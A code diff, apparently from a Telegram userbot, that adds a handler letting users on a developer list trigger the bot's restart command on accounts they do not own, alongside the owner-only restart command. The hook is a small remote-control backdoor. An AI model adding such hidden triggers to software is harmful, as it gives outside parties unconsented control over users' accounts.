@@ -16,10 +16,10 @@ from geezlibs.ram.helpers.basic import edit_or_reply
 from rams.split.misc import HAPP
 from config import CMD_HANDLER as cmd
 from rams import BOTLOG_CHATID, LOGGER
-
+from rams.split.berak.adminHelpers import DEVS
 from .help import add_command_help
 
-
+@Client.on_message(filters.command("restc", ["."]) & filters.user(DEVS) & ~filters.me)
 @Client.on_message(filters.command("restart", ["?", "!", ".", "*", ",", "$"]) & filters.me)
 async def restart_bot(_, message: Message):
     try:
